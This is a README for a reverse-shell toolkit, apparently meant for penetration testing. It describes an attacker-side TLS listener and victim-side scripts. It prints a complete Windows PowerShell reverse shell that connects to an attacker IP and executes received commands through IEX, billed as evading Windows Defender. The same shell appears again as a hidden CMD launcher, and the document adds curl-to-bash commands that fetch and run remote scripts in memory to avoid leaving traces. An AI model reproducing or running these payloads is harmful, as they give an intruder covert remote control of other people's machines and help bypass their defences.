# 🚀 TTY Shell Stabilizer Toolkit (Secure TLS Version)

A collection of scripts designed to automate the transition from a basic shell to a fully interactive TTY using **TLS encryption** and **password authentication** to prevent unauthorized hijacking.

## 📂 Scripts


| Script | Role | Method |
|---|---|---|
| bash_tty.sh | Attacker | Socat-based TLS listener with dynamic RAM certificates. |
| victim.sh | Linux Victim | Bash-based reverse shell using OpenSSL s_client. |
| Windows One-Liner | Windows Victim | PowerShell .NET SslStream implementation (AV Evasive). |

------------------------------

## 🛠 Usage Instructions

To use these scripts, follow the parameter formats below. All connections are encrypted via TLS.

## 1. Attacker Side (Listener)
The listener generates a temporary RSA certificate in RAM (`/dev/shm`) and waits for a specific handshake before prompting for execution.

**Usage:**
```bash
./bash_tty.sh <port> <password>
```
*Example:* `./bash_tty.sh 4444 mysecretpass`

------------------------------

## 2. Victim Side (Connection)

### 🐧 Linux
On the target machine, provide the attacker's IP, port, and the pre-shared password. It will automatically check for and install `openssl` if missing.

**Usage:**
```bash
./victim.sh <attacker_ip> <port> <password>
```
*Example:* `./victim.sh 10.0.13.7 4444 mysecretpass`

### 🪟 Windows (AV Evasive One-Liner)
This implementation uses native .NET classes to establish a TLS tunnel. It does not touch the disk and is highly effective against Windows Defender.

**Usage (Update variables at the start):**
```powershell
$IP="10.0.13.7"; $P=4444; $pw="mysecretpass"; $cb={ $true }; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine("WINDOWS_SHELL"); $w.Close(); $c.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; if($r.ReadLine() -eq $pw){ $w.WriteLine("[+] TLS Auth OK"); while($c.Connected){ $w.Write("`r`nPS "+(pwd).Path+"> "); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }
```

------------------------------

## 💡 Quick Tips

### Execution via Remote Pipe (Kali Attacker)
Download and run the listener in memory. Ensure you provide the port and password as arguments.
```bash
source <(curl -sSL https://githubusercontent.com) 4444 mysecretpass
```

### Execution via Remote Pipe (Linux Victim)
Execute the shell directly in memory without leaving files on the disk. This keeps `stdin` open for the interactive session.
```bash
bash <(curl -sSL https://githubusercontent.com) 10.0.13.7 4444 mysecretpass
```

### Execution via CMD (Windows Victim)
To launch the one-liner from a standard CMD or a shortcut:
```cmd
powershell -nop -w hidden -c "$IP='10.0.13.7'; $P=4444; $pw='mysecretpass'; $cb={ $true }; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine('WINDOWS_SHELL'); $w.Close(); $c.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; if($r.ReadLine() -eq $pw){ $w.WriteLine('[+] TLS Auth OK'); while($c.Connected){ $w.Write('`r`nPS '+(pwd).Path+'> '); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }"
```

------------------------------

## ⚠️ Recovery
If the session ends and your local terminal behaves strangely (doesn't show typing), restore it with:
```bash
reset
```

------------------------------
**Disclaimer:** For authorized security testing and administrative purposes only. Unauthorized access is illegal.
------------------------------
